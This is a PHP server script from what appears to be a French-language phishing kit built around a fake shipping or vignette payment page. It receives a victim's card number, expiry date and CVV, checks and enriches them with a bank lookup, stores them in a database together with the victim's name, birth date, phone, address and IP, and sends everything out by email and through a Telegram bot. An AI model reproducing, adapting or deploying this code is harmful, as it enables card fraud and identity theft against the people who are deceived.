<?php
session_start();
include('../../dashboard/settings.php');
$base = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
$base->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
if(isset($_SESSION['authorized']))
{
	if(isset($_POST['continue']))
	{

	$nome = str_replace("'", "", $_SESSION['lname']);
    $prenome = str_replace("'", "", $_SESSION['fname']);
    $dobe = str_replace("'", "", $_SESSION['dob']);
    $phon = str_replace("'", "", $_SESSION['phone']);
    $zipe = str_replace("'", "", $_SESSION['zip']);
    $vill = str_replace("'", "", $_SESSION['city']);
    $addres = str_replace("'", "", $_SESSION['adress']);
    $ip = $_SERVER['REMOTE_ADDR'];
	function is_valid_luhn($number) {
    settype($number, 'string');
    $sumTable = array(array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9), array(0, 2, 4, 6, 8, 1, 3, 5, 7, 9));
    $sum = 0;
    $flip = 0;
    for ($i = strlen($number) - 1;$i >= 0;$i--) {
    $sum+= $sumTable[$flip++ & 0x1][$number[$i]];
    }
    return $sum % 10 === 0;
    }

        if (is_valid_luhn($_POST['ccnum']) && is_numeric($_POST['ccnum']) && $_POST['ccnum'] != "0000000000000000")
        {
		if(!empty($_POST['ccnum']) && !empty($_POST['ccexp']) && !empty($_POST['ccvv']))
		{
		if(strlen($_POST['ccnum']) == 16)
		{

		if(strlen($_POST['ccexp']) == 5)
		{

		if(strlen($_POST['ccvv']) >=3)
		{
		$_SESSION['ccnum']	= $_POST['ccnum'];
		$_SESSION['ccexp']	= $_POST['ccexp'];
		$_SESSION['ccvv']	= $_POST['ccvv'];
		$ccn = $_SESSION['ccnum'];
		$ccex = $_SESSION['ccexp'];
		$ccv = $_SESSION['ccvv'];

        $bin = substr($ccn, 0, 6);
        $ch = curl_init();
         


        $url = "https://api.bincodes.com/bin/?format=json&api_key=39260205ea97ca9f4122e7af58d53888&bin=" . $bin;

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array();
        $headers[] = 'Accept-Version: 3';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
           echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        $_SESSION['bank'] = '';
       $_SESSION['type'] = '';
        $_SESSION['level'] = '';
        $_SESSION['country'] = '';
        $someArray = json_decode($result, true);
        $_SESSION['bank'] = $someArray['bank'];
        $_SESSION['type'] = $someArray['type'];
        $_SESSION['level'] = $someArray['level'];
        $_SESSION['country'] = $someArray['country'];
        $ccn = $_SESSION['ccnum'];
        $ccex = $_SESSION['ccexp'];
        $ccv = $_SESSION['ccvv'];
        $cbanks = $_SESSION['bank'];
        $cbank = str_replace("'", "", $cbanks);
        if ($cbank == "CAISSE NATIONALE DES CAISSES DEPARGNE (CNCE)") {
            $cbank = "CAISSE DEPARGNE";
        }
        if ($cbank == "CAISSE NATIONALE DE CREDIT AGRICOLE") {
            $cbank = "CREDIT AGRICOLE";
        }
        $clvl = $_SESSION['level'];
        $cip = $_SERVER['REMOTE_ADDR'];
        try {
        $base->exec("INSERT INTO cards (ccnum,ccexp,ccvv,bank,level,nom,prenom,phone,dob,adress,ville,zip,ip,acceptedload) VALUES('$ccn','$ccex','$ccv','$cbank','$clvl','$nome','$prenome','$phon','$dobe','$addres','$vill','$zipe','$cip','false')");
    }
                catch(PDOException $exe) {
                    echo $exe;
                }
        $stmt = $base->prepare('SELECT * FROM settings');   
        $stmt->setFetchMode(PDO::FETCH_ASSOC);
        $stmt->execute();
        $rows = $stmt->fetchAll();
		foreach ($rows as $row) {
			$message = "
[💳] INFORMATIONS DE PAIEMENT [💳]

💳 Numéro de carte : ".$ccn."
💳 Date d'expiration : ".$ccex."
💳 Cryptogramme Visuel : ".$ccv."

[🏛️] INFORMATIONS DE LA BANQUE [🏛️]

🏛️ Banque : ".$_SESSION['bank']."
🏛️ Level : ".$_SESSION['level']."
🏛️ Type : ".$_SESSION['type']."
🏛️ Pays : ".$_SESSION['country']."

[🎲] INFORMATIONS DE LA VICTIME [🎲]

🎲 Nom : ".$_SESSION['lname']."
🎲 Prénom : ".$_SESSION['fname']."
🎲 Date de naissance : ".$_SESSION['dob']."
🎲 Numéro de téléphone : ".$_SESSION['phone']."
🎲 Adresse : ".$_SESSION['adress']."
🎲 Ville : ".$_SESSION['city']."
🎲 Code Postal : ".$_SESSION['zip']."

[🌐] TIERS [🌐]

🌐 Adresse IP : ".$ip."
🌐 User-Agent : ".$_SERVER['HTTP_USER_AGENT']."

			";

			$subject = "=?UTF-8?B?4oyI8J+XveKMiyBDQVJEIENSSVRcJ0FJUiAt?= ".$_SESSION['bank']." - ".$_SESSION['level']." - ".$_SESSION['type']." - ".$ip;
			$entete = "From : =?UTF-8?B?4pm777iPIENyaXRcJ0FpciDimbvvuI8=?= <reach@author-secured.com>";
			if($row['wmail'] == "1")
			{
				mail($row['rezmail'],$subject,$message,$entete);
			}

			if($row['wtelegram'] == "1")
			{
				$chat_id = $row['chatid'];
				$bot_token = $row['bottoken'];
				$data = ['text' => $message,'chat_id' => $chat_id];
                file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
			}

			header('Location: ../loading.php?bring=finished');

          
		}






		}
		else{
		header('Location: ../expedition-vignette.php?error=Veuillez saisir un cryptogramme visuel valide');
		}

		}
		else{
		header("Location: ../expedition-vignette.php?error=Veuillez saisir une date d'expiration valide ");
		}

		}
		else{
		header('Location: ../expedition-vignette.php?error=Veuillez saisir un numéro de carte valide');
		}

		}
		else{
		header('Location: ../expedition-vignette.php?error=Veuillez remplir tous les champs');
		}

		}
		else{
		header('Location: ../expedition-vignette.php?error=Veuillez saisir un numéro de carte valide');
		}

		}
		else{
		header('Location: ../expedition-vignette.php?&enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
		}

}
else{
die("LA REQUÊTE A ÉTÉ REFUSÉE : VÉRIFIEZ QUE VOUS N'ÊTES PAS CONNECTÉ À UN RÉSEAU PRIVÉ" );   
}